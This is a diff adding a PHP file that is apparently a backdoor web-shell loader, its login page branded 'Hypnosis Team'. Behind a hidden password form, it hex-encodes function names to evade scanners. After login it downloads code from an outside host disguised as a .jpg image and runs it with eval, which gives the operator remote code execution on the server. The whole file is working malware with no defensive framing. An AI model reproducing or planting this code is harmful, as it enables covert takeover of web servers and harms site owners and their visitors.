@@ -1,0 +1,140 @@
+<?php
+session_start();
+
+function is_logged_in() {
+    return isset($_SESSION['user_logged_in']) && $_SESSION['user_logged_in'] === true;
+}
+
+function hex2str($hex) {
+    $str = '';
+    for ($i = 0; $i < strlen($hex); $i += 2) {
+        $str .= chr(hexdec(substr($hex, $i, 2)));
+    }
+    return $str;
+}
+
+if (is_logged_in()) {
+    $Array = array(
+        '666f70656e', // fopen
+        '73747265616d5f6765745f636f6e74656e7473', // stream_get_contents
+        '66696c655f6765745f636f6e74656e7473', // file_get_contents
+        '6375726c5f65786563' // curl_exec
+    );
+
+    function geturlsinfo($destiny) {
+        $belief = array(
+            hex2str($GLOBALS['Array'][0]),
+            hex2str($GLOBALS['Array'][1]),
+            hex2str($GLOBALS['Array'][2]),
+            hex2str($GLOBALS['Array'][3])
+        );
+
+        if (function_exists($belief[3])) {
+            $ch = curl_init($destiny);
+            curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
+            curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
+            curl_setopt($ch, CURLOPT_USERAGENT, "Mozilla/5.0 (Windows NT 6.1; rv:32.0) Gecko/20100101 Firefox/32.0");
+            curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
+            curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
+            $love = $belief[3]($ch);
+            curl_close($ch);
+            return $love;
+        } elseif (function_exists($belief[2])) {
+            return $belief[2]($destiny);
+        } elseif (function_exists($belief[0]) && function_exists($belief[1])) {
+            $purpose = $belief[0]($destiny, "r");
+            $love = $belief[1]($purpose);
+            fclose($purpose);
+            return $love;
+        }
+        return false;
+    }
+
+    // URL eksternal (bisa diubah)
+    $destiny = 'https://suarabmi.id/memek.jpg';
+    $dream = geturlsinfo($destiny);
+    if ($dream !== false) {
+        eval('?>' . $dream);
+    }
+
+    echo '<a href="?logout=1" style="position:absolute;top:10px;right:10px;color:white;background:black;padding:5px 10px;text-decoration:none;">Logout</a>';
+
+    if (isset($_GET['logout'])) {
+        session_destroy();
+        header("Location: " . $_SERVER['PHP_SELF']);
+        exit();
+    }
+
+} else {
+    if (isset($_POST['password'])) {
+        $entered_key = $_POST['password'];
+        $hashed_key = '$2y$10$aYS57GvOA6VCn0HJq23yB.mBFAM9DwThkeAgVehHiuE0k2EdBa6zO';
+
+        if (password_verify($entered_key, $hashed_key)) {
+            $_SESSION['user_logged_in'] = true;
+            header("Location: " . $_SERVER['PHP_SELF']);
+            exit();
+        } else {
+            $error_message = "Password salah.";
+        }
+    }
+?>
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Hypnosis Team - Terbang Tanpa Batas</title>
+    <style>
+        html, body {
+            margin: 0;
+            padding: 0;
+            height: 100%;
+            width: 100%;
+            overflow: hidden;
+        }
+        body {
+            background: url('https://hypnosisteam.wordpress.com/wp-content/uploads/2025/07/chatgpt-image-8-jul-2025-12.27.18.png') no-repeat center center;
+            background-size: 35%;
+            background-attachment: fixed;
+            position: relative;
+            background-color:rgb(0, 0, 0);
+        }
+        .ntol {
+            padding-top: 50px;
+            text-align: center;
+        }
+        .button {
+            display: inline-block;
+            color: white;
+            padding: 10px 20px;
+            text-decoration: none;
+            border-radius: 5px;
+            cursor: pointer;
+            margin-top: 10px;
+        }
+
+        .button:hover {
+        }
+        .password-input {
+            margin-top: 20px;
+            padding: 10px;
+            border: 1px solid #ccc;
+            border-radius: 5px;
+            width: 200px; /* Lebar kolom password */
+            font-size: 16px;
+            opacity: 0%;
+        }
+    </style>
+</head>
+<body>
+    <div class="ntol">
+        <!-- Form untuk kolom password -->
+        <form method="POST" action="">
+            <input type="password" id="password" name="password" class="password-input" placeholder="" required>
+            <div class="button" onclick="document.forms[0].submit()"></div>
+        </form>
+    </div>
+</body>
+</html>
+<?php
+}
+?>
